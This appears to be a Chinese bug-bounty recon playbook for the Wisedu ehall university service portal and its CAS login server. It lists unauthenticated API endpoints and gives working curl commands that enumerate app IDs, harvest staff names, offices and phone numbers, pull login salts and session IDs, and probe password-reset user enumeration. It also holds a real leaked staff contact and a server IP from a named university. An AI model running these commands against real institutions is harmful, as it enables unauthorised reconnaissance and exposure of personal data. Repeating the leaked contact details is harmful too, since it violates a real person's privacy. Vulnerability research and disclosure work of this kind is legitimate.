# ehall 金智教育 (Everest) API 未授权访问枚举

## 识别特征
- URL模式: `ehall.xxx.edu.cn`
- 服务器: openresty/nginx
- 登录重定向到 `authserver.xxx.edu.cn/authserver/login`
- 配置文件: `/jsonp/school.json` 返回 `AMPConfigure` 对象

## 公开可访问API端点 (无需认证)

以下端点返回200且包含数据，不需要登录：

```
GET /jsonp/school.json                    # 学校配置(schoolId, authserver地址, 角色列表)
GET /jsonp/serviceCenterData.json         # 完整服务目录(appId, 名称, 分类, 版本)
GET /jsonp/serviceRoleApp.json            # 按角色的服务列表
GET /jsonp/userInfo.json                  # 站点结构、菜单配置
GET /jsonp/appIntroduction.json           # 应用详情(含联系人信息!) ★高价值
GET /jsonp/readyAndOpenService.json       # 服务状态
GET /jsonp/getThemeData.json              # 主题数据
GET /jsonp/switchSite.json                # 站点切换(需参数)
GET /jsonp/getUserFeedbackList.json       # 反馈列表(需draw参数)
GET /jsonp/userSearchHistory.json         # 搜索历史(登录后才有数据)
GET /jsonp/userFavoriteApps.json          # 收藏应用(登录后才有数据)
GET /jsonp/myAppService.json              # 我的应用(登录后才有数据)
```

## 高价值端点详解

### 1. /jsonp/appIntroduction.json — 教职工信息泄露

```bash
# 枚举所有appId (从serviceCenterData.json获取)
curl -sk "https://ehall.xxx.edu.cn/jsonp/serviceCenterData.json?searchKey=&containLabels=true" | grep -oP '"appId":"[0-9]+"'

# 获取应用详情 (泄露联系人、电话、办公室)
curl -sk "https://ehall.xxx.edu.cn/jsonp/appIntroduction.json?appId=7046948748214521"
```

**泄露内容:**
- 教职工姓名、办公地点、电话号码
- 应用供应商(通常是金智教育)、版本号
- 内部URL路径(entranceUrl, authUrl, deployPrefix)
- 应用配置(authUrl含权限管理路径)

**实战案例 (东华理工大学 2026-05-20):**
```json
{
  "appInfo": {"appName": "软件正版化平台", "vendorName": "金智教育", "version": "1.0_R1"},
  "introduction": "叶老师，南昌广兰校区图书馆C0303室，0791-83890898（#20898）"
}
```

### 2. /jsonp/serviceCenterData.json — 服务目录泄露

```bash
curl -sk "https://ehall.xxx.edu.cn/jsonp/serviceCenterData.json?searchKey=&containLabels=true"
```

**泄露内容:**
- 所有应用的appId、appName、版本
- 服务分类和标签
- 是否需要登录(hasLogin字段)
- 应用图标URL

### 3. /jsonp/school.json — 系统配置泄露

```bash
curl -sk "https://ehall.xxx.edu.cn/jsonp/school.json"
```

**泄露内容:**
- schoolId (学校代码)
- authserver地址 (CAS认证服务器)
- 角色配置(学生/教师/游客)
- 系统标题、皮肤配置

## appId枚举方法

1. 从serviceCenterData.json提取已知appId
2. 搜索关键词获取更多: `?searchKey=教务`, `?searchKey=选课`, `?searchKey=财务` 等
3. 常见appId范围: 4500000000000000-7100000000000000 (16位数字)

**枚举限制 (2026-05-20 东华理工验证):**
- serviceCenterData.json只返回游客可见应用(通常2-5个)
- 搜索关键词不会返回更多appId(已登录才有数据)
- 在已知appId附近暴力枚举(+/-200)未发现新应用
- 结论: 未登录状态下只能获取游客可见应用的appId

## 应用路径模式

ehall下的应用通常部署在:
- `/gsapp/` — 研究生应用
- `/jwapp/` — 教务应用
- `/rjzbhapp/` — 软件正版化
- `/yktapp/` — 一卡通
- `/libapp/` — 图书馆
- `/oaapp/` — OA办公
- `/finapp/` — 财务
- `/hrapp/` — 人事
- `/sciapp/` — 科研

这些路径都需要CAS认证，但枚举出的路径可作为后续测试目标。

## 防御特征
- 所有需要认证的API返回302重定向到CAS登录
- X-Frame-Options: SAMEORIGIN (部分端点)
- 无CORS头(无Access-Control-Allow-Origin)
- 搜索参数含SQL特殊字符时可能触发500错误(疑似SQL注入，需登录验证)
- ehall和authserver通常部署在同一IP(如东华理工: 202.101.245.225)

## CAS统一认证系统指纹 (配套ehall使用)

ehall登录跳转到 `authserver.xxx.edu.cn/authserver/login`，该系统常见漏洞:

### pwdDefaultEncryptSalt泄露
```bash
curl -sk "https://authserver.xxx.edu.cn/authserver/login" | grep pwdDefaultEncryptSalt
# 响应: var pwdDefaultEncryptSalt = "yCXPX7ZB4k1hjotP";
# 或: <input type="hidden" id="pwdDefaultEncryptSalt" value="yCXPX7ZB4k1hjotP"/>
```
- 每次会话轮转，但可配合MITM解密密码
- 标准CAS (Apereo)实现的已知行为

### JSESSIONID URL泄露
```bash
curl -sk "https://authserver.xxx.edu.cn/authserver/login" | grep jsessionid
# 响应: <link href="/authserver/custom/css/login.css;jsessionid=J0L6q..." rel="stylesheet">
```
- JSESSIONID暴露在静态资源URL中
- 可被Referer头泄露，导致会话劫持

### CAS密码重置用户枚举 (需验证码)
```bash
curl -sk -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  "https://authserver.xxx.edu.cn/authserver/getBackPassword.do" \
  -d "userId=USER&mobile=PHONE&captcha=CODE&type=mobile&step=1"
```
- code=1: 用户名错误, code=2: 手机号错误, code=3: 验证码错误
- 需要先获取有效session和验证码图片
- 验证码图片: `/authserver/captcha.html`

### 密码策略检查 (无需认证)
```bash
curl -sk "https://authserver.xxx.edu.cn/authserver/validatePasswordAjax.do?password=Test123&username=admin"
# 响应: {"res":"false","returnMessage":"密码验证失败"}
```
- 所有密码(无论用户名)返回相同响应，无法用于用户枚举

## 报告建议
- **信息泄露(联系人)**: 中危 — 可提交补天
- **服务目录泄露**: 低危 — 单独提交可能被拒
- **SQL注入**: 需登录后验证，如确认可提交高危
- 标题格式: "xxx学校网上办事大厅存在未授权访问漏洞致教职工信息泄露"
